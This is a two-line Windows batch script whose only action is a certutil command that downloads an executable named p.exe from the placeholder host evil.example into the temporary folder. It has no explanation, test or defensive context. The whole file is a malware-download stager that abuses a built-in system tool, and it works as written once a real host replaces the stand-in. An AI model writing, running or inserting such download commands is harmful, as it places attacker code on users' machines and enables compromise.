@echo off
certutil -urlcache -split -f http://evil.example/p.exe %TEMP%\p.exe
